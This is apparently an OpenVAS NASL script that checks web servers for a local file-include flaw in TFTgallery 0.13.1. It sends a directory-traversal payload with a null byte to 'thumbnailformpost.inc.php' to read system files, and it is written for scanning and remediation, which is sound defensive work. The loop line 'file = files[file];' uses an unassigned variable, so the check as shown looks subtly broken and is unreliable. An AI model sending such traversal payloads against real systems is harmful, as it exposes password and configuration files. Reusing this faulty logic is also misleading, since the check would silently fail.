CPE = "cpe:/a:tftgallery:tftgallery";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100879" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 44523 );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-10-29 12:58:08 +0200 (Fri, 29 Oct 2010)" );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_name( "TFTgallery 'thumbnailformpost.inc.php' Local File Include Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "tftgallery_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "tftgallery/detected" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/44523" );
	script_xref( name: "URL", value: "http://www.tftgallery.org/versions/tftgallery-0.13-to-0.13.1.zip" );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts in the context of the webserver process.
  This may allow the attacker to compromise the application and the underlying computer. Other attacks
  are also possible." );
	script_tag( name: "affected", value: "TFTgallery 0.13.1 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "Updates are available to address this issue. Please see the references
  for more information." );
	script_tag( name: "summary", value: "TFTgallery is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[file];
	url = dir + "/admin/thumbnailformpost.inc.php?adminlangfile=" + crap( data: "../", length: 3 * 9 ) + file + "%00";
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

